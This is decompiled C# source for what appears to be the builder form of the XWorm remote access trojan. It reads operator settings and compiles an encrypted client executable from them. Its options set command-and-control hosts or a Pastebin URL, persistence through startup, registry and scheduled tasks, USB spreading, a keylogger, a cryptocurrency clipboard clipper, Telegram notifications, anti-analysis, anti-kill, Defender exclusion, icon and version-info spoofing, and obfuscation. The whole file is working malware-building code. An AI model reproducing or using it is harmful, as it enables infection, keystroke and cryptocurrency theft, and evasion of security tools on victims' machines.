			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Obfuscator", null), "True", TextCompare: false))
			{
				Guna2CheckBox4.Checked = true;
			}
			else
			{
				Guna2CheckBox4.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Startup", null), "True", TextCompare: false))
			{
				Guna2CheckBox6.Checked = true;
			}
			else
			{
				Guna2CheckBox6.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Reg", null), "True", TextCompare: false))
			{
				Guna2CheckBox5.Checked = true;
			}
			else
			{
				Guna2CheckBox5.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Task", null), "True", TextCompare: false))
			{
				Guna2CheckBox7.Checked = true;
			}
			else
			{
				Guna2CheckBox7.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Analysis", null), "True", TextCompare: false))
			{
				Guna2ToggleSwitch1.Checked = true;
			}
			else
			{
				Guna2ToggleSwitch1.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Hosts", null), null, TextCompare: false))
			{
				ListBox1.Items.Add("127.0.0.1");
			}
			else
			{
				string[] array = Strings.Split(Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Hosts", null)), ",");
				foreach (string text in array)
				{
					if (!string.IsNullOrEmpty(text))
					{
						ListBox1.Items.Add(text);
					}
				}
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Port", null), null, TextCompare: false))))
			{
				Guna2TextBox3.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Port", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Key", null), null, TextCompare: false))))
			{
				Guna2TextBox1.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Key", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Groub", null), null, TextCompare: false))))
			{
				Guna2TextBox7.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Groub", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Url", null), null, TextCompare: false))))
			{
				Guna2TextBox4.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Url", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Sleep", null), null, TextCompare: false))))
			{
				Guna2NumericUpDown1.Value = new decimal(Convert.ToInt32(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Sleep", null))));
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Pastebin", null), "True", TextCompare: false))
			{
				Guna2TextBox2.Enabled = false;
				ListBox1.Enabled = false;
				Guna2TextBox3.Enabled = false;
				Guna2CheckBox3.Checked = true;
				Guna2TextBox4.Enabled = true;
			}
			else
			{
				Guna2TextBox2.Enabled = true;
				ListBox1.Enabled = true;
				Guna2TextBox3.Enabled = true;
				Guna2CheckBox3.Checked = false;
				Guna2TextBox4.Enabled = false;
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "USBN", null), null, TextCompare: false))))
			{
				Guna2TextBox6.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "USBN", null));
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "USBE", null), "True", TextCompare: false))
			{
				Guna2CheckBox8.Checked = true;
				Guna2TextBox6.Enabled = true;
			}
			else
			{
				Guna2CheckBox8.Checked = false;
				Guna2TextBox6.Enabled = false;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void method_0(string Path, string Code)
	{
		try
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("CompilerVersion", "v4.0");
			VBCodeProvider vBCodeProvider = new VBCodeProvider(dictionary);
			CompilerParameters compilerParameters = new CompilerParameters();
			string compilerOptions = " /target:winexe /platform:anycpu /nowarn";
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.GenerateExecutable = true;
			compilerParameters2.OutputAssembly = Path;
			compilerParameters2.CompilerOptions = compilerOptions;
			compilerParameters2.IncludeDebugInformation = false;
			compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters2.ReferencedAssemblies.Add("System.dll");
			compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
			compilerParameters2.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters2.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters2.ReferencedAssemblies.Add("System.Core.dll");
			CompilerResults compilerResults = vBCodeProvider.CompileAssemblyFromSource(compilerParameters, Code);
			if (compilerResults.Errors.Count > 0)
			{
				{
					IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(enumerator.Current), null, "ErrorText", new object[0], null, null, null)), MsgBoxStyle.Critical);
							return;
						}
					}
					finally
					{
						IDisposable disposable = enumerator as IDisposable;
						if (disposable != null)
						{
							disposable.Dispose();
						}
					}
				}
			}
			compilerParameters2 = null;
			if (Guna2CheckBox2.Checked)
			{
				GClass1.smethod_0(Path, string_0);
			}
			if (Guna2CheckBox4.Checked)
			{
				Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(Path), Path));
			}
			GC.Collect();
			FileInfo fileInfo = new FileInfo(Path);
			MessageBox.Show(Path, "DONE! : " + Module0.smethod_11(fileInfo.Length));
			Hide();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	public object method_1(string input, string Pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(method_2(Pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		byte[] array2 = method_2(input);
		return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	private byte[] method_2(string s)
	{
		return Encoding.UTF8.GetBytes(s);
	}

	private void Guna2CheckBox8_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox8.Checked)
		{
			Guna2TextBox6.Enabled = true;
		}
		else
		{
			Guna2TextBox6.Enabled = false;
		}
	}

	private void Guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (bool_1)
		{
			bool_1 = false;
			return;
		}
		if (Guna2CheckBox2.Checked)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
			openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				if (openFileDialog.FileName.EndsWith(".exe"))
				{
					string_0 = Module0.smethod_17(openFileDialog.FileName);
					PictureBox1.ImageLocation = string_0;
					GC.Collect();
				}
				else
				{
					string_0 = openFileDialog.FileName;
					PictureBox1.ImageLocation = string_0;
				}
			}
			else
			{
				string_0 = null;
				PictureBox1.Image = null;
				Guna2CheckBox2.Checked = false;
			}
			openFileDialog2 = null;
		}
		if (!Guna2CheckBox2.Checked)
		{
			string_0 = null;
			PictureBox1.Image = null;
			Guna2CheckBox2.Checked = false;
		}
	}

	private void Guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (bool_0)
		{
			bool_0 = false;
			return;
		}
		if (Guna2CheckBox1.Checked)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "(*.exe|*.exe";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string_1 = openFileDialog.FileName;
				Guna2CheckBox1.Checked = true;
			}
			else
			{
				string_1 = null;
				Guna2CheckBox1.Checked = false;
			}
		}
		if (!Guna2CheckBox1.Checked)
		{
			string_1 = null;
			Guna2CheckBox1.Checked = false;
		}
	}

	private void Guna2CheckBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox3.Checked)
		{
			Guna2TextBox2.Enabled = false;
			ListBox1.Enabled = false;
			Guna2TextBox3.Enabled = false;
			Guna2TextBox4.Enabled = true;
		}
		else
		{
			Guna2TextBox2.Enabled = true;
			ListBox1.Enabled = true;
			Guna2TextBox3.Enabled = true;
			Guna2TextBox4.Enabled = false;
		}
	}

	private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
	{
		try
		{
			if ((Guna2TextBox1.Text.Length > 32) | (Guna2TextBox1.Text.Length < 1))
			{
				Guna2GradientButton1.Enabled = false;
			}
			else
			{
				Guna2GradientButton1.Enabled = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Guna2GradientButton1.Enabled = false;
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox2_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.KeyCode == Keys.Return)
			{
				e.SuppressKeyPress = true;
				if (!string.IsNullOrEmpty(Guna2TextBox2.Text) && (!ListBox1.Items.Contains(Guna2TextBox2.Text) || string.IsNullOrEmpty(Guna2TextBox2.Text)))
				{
					ListBox1.Items.Add(Guna2TextBox2.Text);
					Guna2TextBox2.Clear();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox3_TextChanged(object sender, EventArgs e)
	{
		try
		{
			Conversions.ToInteger(Guna2TextBox3.Text);
			if ((Conversions.ToInteger(Guna2TextBox3.Text) > 65534) | (Conversions.ToInteger(Guna2TextBox3.Text) < 1))
			{
				Guna2GradientButton1.Enabled = false;
			}
			else
			{
				Guna2GradientButton1.Enabled = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Guna2GradientButton1.Enabled = false;
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2CheckBox6_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox6.Checked | Guna2CheckBox5.Checked | Guna2CheckBox7.Checked)
		{
			Guna2ComboBox2.Enabled = true;
			Guna2TextBox5.Enabled = true;
		}
		else
		{
			Guna2ComboBox2.Enabled = false;
			Guna2TextBox5.Enabled = false;
		}
	}

	private void Guna2CheckBox5_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox5.Checked | Guna2CheckBox6.Checked | Guna2CheckBox7.Checked)
		{
			Guna2ComboBox2.Enabled = true;
			Guna2TextBox5.Enabled = true;
		}
		else
		{
			Guna2ComboBox2.Enabled = false;
			Guna2TextBox5.Enabled = false;
		}
	}

	private void Guna2CheckBox7_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox7.Checked | Guna2CheckBox6.Checked | Guna2CheckBox5.Checked)
		{
			Guna2ComboBox2.Enabled = true;
			Guna2TextBox5.Enabled = true;
		}
		else
		{
			Guna2ComboBox2.Enabled = false;
			Guna2TextBox5.Enabled = false;
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (!((ListBox1.Items.Count > 0) | Guna2CheckBox3.Checked))
		{
			return;
		}
		string text = "";
		checked
		{
			try
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog
				{
					Filter = "(*.exe)|*.exe",
					OverwritePrompt = false,
					FileName = "XClient.exe"
				};
				if (saveFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				try
				{
					if (ListBox1.Items.Count > 0)
					{
						foreach (object item in ListBox1.Items)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(item);
							text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
						}
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Hosts", text);
					}
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "Port", Guna2TextBox3.Text);
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "Key", Guna2TextBox1.Text);
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "Groub", Guna2TextBox7.Text);
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "USBN", Guna2TextBox6.Text);
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "Url", Guna2TextBox4.Text);
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "Sleep", Guna2NumericUpDown1.Value.ToString());
					if (Guna2CheckBox6.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Startup", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Startup", "False");
					}
					if (Guna2CheckBox5.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Reg", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Reg", "False");
					}
					if (Guna2CheckBox7.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Task", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Task", "False");
					}
					if (Guna2CheckBox6.Checked | Guna2CheckBox5.Checked | Guna2CheckBox7.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "InstallDir", Guna2ComboBox2.SelectedIndex.ToString());
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "InstallDir", "False");
					}
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "InstallStr", Guna2TextBox5.Text);
					if (Guna2ToggleSwitch1.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Analysis", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Analysis", "False");
					}
					if (Guna2CheckBox8.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "USBE", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "USBE", "False");
					}
					if (Operators.CompareString(string_1, null, TextCompare: false) == 0)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Assembly", "False");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Assembly", string_1);
					}
					if (Operators.CompareString(string_0, null, TextCompare: false) == 0)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Icon", "False");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Icon", string_0);
					}
					if (Guna2ToggleSwitch6.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Clipper", "True");
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "BTC", string_4);
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "ETH", string_5);
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "TRC20", string_6);
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Clipper", "False");
					}
					if (Guna2ToggleSwitch5.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "TBotNotify", "True");
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "BotToken", string_3);
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Botid", string_2);
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "TBotNotify", "False");
					}
					if (Guna2CheckBox3.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Pastebin", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Pastebin", "False");
					}
					if (Guna2ToggleSwitch2.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Keylogger", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Keylogger", "False");
					}
					if (Guna2ToggleSwitch3.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "AntiKill", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "AntiKill", "False");
					}
					if (Guna2ToggleSwitch4.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "WDEX", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "WDEX", "False");
					}
					if (Guna2CheckBox4.Checked)
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Obfuscator", "True");
					}
					else
					{
						MyProject.Computer.Registry.SetValue(GClass19.string_4, "Obfuscator", "False");
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Debug.WriteLine(ex.Message);
					ProjectData.ClearProjectError();
				}
				string stub = XWorm_Resources.Stub;
				string text2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
				StringBuilder stringBuilder = new StringBuilder();
				Random random = new Random();
				int num = 1;
				do
				{
					int index = random.Next(0, text2.Length);
					char value = text2[index];
					stringBuilder.Append(value);
					num++;
				}
				while (num <= 16);
				string text3 = stringBuilder.ToString();
				stub = stub.Replace("%Mutex%", text3);
				stub = stub.Replace("%USB%", Conversions.ToString(method_1(Guna2TextBox6.Text, text3)));
				if (Guna2CheckBox3.Checked)
				{
					stub = Strings.Replace(stub, "#Const Pastebin = False", "#Const Pastebin = True");
					stub = stub.Replace("%PasteUrl%", Conversions.ToString(method_1(Guna2TextBox4.Text, text3)));
				}
				else
				{
					stub = stub.Replace("%Hosts%", Conversions.ToString(method_1(text.Trim().Substring(0, text.Length - 1), text3)));
					stub = stub.Replace("%Port%", Conversions.ToString(method_1(Guna2TextBox3.Text, text3)));
				}
				stub = stub.Replace("%KEY%", Conversions.ToString(method_1(Guna2TextBox1.Text, text3)));
				stub = stub.Replace("%Groub%", Conversions.ToString(method_1(Guna2TextBox7.Text, text3)));
				stub = stub.Replace("%SPL%", Conversions.ToString(method_1("<Xwormmm>", text3)));
				stub = stub.Replace("%Sleep%", Guna2NumericUpDown1.Value.ToString());
				if (Guna2CheckBox8.Checked)
				{
					stub = Strings.Replace(stub, "#Const USBLNK = False", "#Const USBLNK = True");
				}
				if (Guna2CheckBox6.Checked)
				{
					stub = Strings.Replace(stub, "#Const Startup = False", "#Const Startup = True");
				}
				if (Guna2CheckBox7.Checked)
				{
					stub = Strings.Replace(stub, "#Const Schtasks = False", "#Const Schtasks = True");
				}
				if (Guna2CheckBox5.Checked)
				{
					stub = Strings.Replace(stub, "#Const RegAdd = False", "#Const RegAdd = True");
				}
				if (Guna2ToggleSwitch1.Checked)
				{
					stub = Strings.Replace(stub, "#Const Analysis = False", "#Const Analysis = True");
				}
				if (Guna2CheckBox6.Checked | Guna2CheckBox5.Checked | Guna2CheckBox7.Checked)
				{
					stub = Strings.Replace(stub, "%Path%", Conversions.ToString(method_1(Guna2ComboBox2.Text, text3)));
					stub = Strings.Replace(stub, "%Name%", Conversions.ToString(method_1(Guna2TextBox5.Text, text3)));
				}
				if (Guna2ToggleSwitch6.Checked)
				{
					stub = Strings.Replace(stub, "#Const Clipper = False", "#Const Clipper = True");
					stub = Strings.Replace(stub, "%BTC%", Conversions.ToString(method_1(string_4, text3)));
					stub = Strings.Replace(stub, "%ETH%", Conversions.ToString(method_1(string_5, text3)));
					stub = Strings.Replace(stub, "%Trc20%", Conversions.ToString(method_1(string_6, text3)));
				}
				if (Guna2ToggleSwitch5.Checked)
				{
					stub = Strings.Replace(stub, "#Const TelegramBot = False", "#Const TelegramBot = True");
					stub = Strings.Replace(stub, "%Token%", Conversions.ToString(method_1(string_3, text3)));
					stub = Strings.Replace(stub, "%ChatID%", Conversions.ToString(method_1(string_2, text3)));
				}
				if (Guna2ToggleSwitch2.Checked)
				{
					stub = Strings.Replace(stub, "#Const Logger = False", "#Const Logger = True");
				}
				if (Guna2ToggleSwitch3.Checked)
				{
					stub = Strings.Replace(stub, "#Const BDOS = False", "#Const BDOS = True");
				}
				if (Guna2ToggleSwitch4.Checked)
				{
					stub = Strings.Replace(stub, "#Const WDEX = False", "#Const WDEX = True");
				}
				if (Guna2CheckBox1.Checked)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(string_1);
					stub = Strings.Replace(stub, "%Title%", versionInfo.FileDescription);
					stub = Strings.Replace(stub, "%Des%", versionInfo.Comments);
					stub = Strings.Replace(stub, "%Company%", versionInfo.CompanyName);
					stub = Strings.Replace(stub, "%Product%", versionInfo.ProductName);
					stub = Strings.Replace(stub, "%Copyright%", versionInfo.LegalCopyright);
					stub = Strings.Replace(stub, "%Trademark%", versionInfo.LegalTrademarks);
					stub = Strings.Replace(stub, "%Guid%", Guid.NewGuid().ToString());
					stub = stub.Replace("%v1%", versionInfo.FileMajorPart.ToString());
					stub = stub.Replace("%v2%", versionInfo.FileMinorPart.ToString());
					stub = stub.Replace("%v3%", versionInfo.FileBuildPart.ToString());
					stub = stub.Replace("%v4%", versionInfo.FilePrivatePart.ToString());
				}
				else
				{
					stub = Strings.Replace(stub, "%Title%", null);
					stub = Strings.Replace(stub, "%Des%", null);
					stub = Strings.Replace(stub, "%Company%", null);
					stub = Strings.Replace(stub, "%Product%", null);
					stub = Strings.Replace(stub, "%Copyright%", null);
					stub = Strings.Replace(stub, "%Trademark%", null);
					stub = Strings.Replace(stub, "%Guid%", Guid.NewGuid().ToString());
					stub = stub.Replace("%v1%", Conversions.ToString(1));
					stub = stub.Replace("%v2%", Conversions.ToString(0));
					stub = stub.Replace("%v3%", Conversions.ToString(0));
					stub = stub.Replace("%v4%", Conversions.ToString(0));
				}
				method_0(saveFileDialog.FileName, stub);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Guna2ToggleSwitch5_MouseClick(object sender, MouseEventArgs e)
	{
		if (!Guna2ToggleSwitch5.Checked)
		{
			return;
		}
		using TBotNotify tBotNotify = new TBotNotify();
		tBotNotify.StartPosition = FormStartPosition.Manual;
		tBotNotify.StartPosition = FormStartPosition.CenterParent;
		if (tBotNotify.ShowDialog() == DialogResult.OK)
		{
			string_3 = tBotNotify.Guna2TextBox1.Text;
			string_2 = tBotNotify.Guna2TextBox2.Text;
		}
		else
		{
			Guna2ToggleSwitch5.Checked = false;
			string_3 = null;
			string_2 = null;
		}
	}

	private void Guna2ToggleSwitch6_MouseClick(object sender, MouseEventArgs e)
	{
		if (!Guna2ToggleSwitch6.Checked)
		{
			return;
		}
		using Clipper clipper = new Clipper();
		clipper.StartPosition = FormStartPosition.Manual;
		clipper.StartPosition = FormStartPosition.CenterParent;
		if (clipper.ShowDialog() == DialogResult.OK)
		{
			string_4 = clipper.Guna2TextBox1.Text;
			string_5 = clipper.Guna2TextBox2.Text;
			string_6 = clipper.Guna2TextBox3.Text;
		}
		else
		{
			Guna2ToggleSwitch6.Checked = false;
			string_4 = null;
			string_5 = null;
			string_6 = null;
		}
	}

	private void Guna2TextBox2_IconRightClick(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(Guna2TextBox2.Text) && !ListBox1.Items.Contains(Guna2TextBox2.Text))
			{
				ListBox1.Items.Add(Guna2TextBox2.Text);
				Guna2TextBox2.Clear();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox2_IconLeftClick(object sender, EventArgs e)
	{
		try
		{
			ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}
}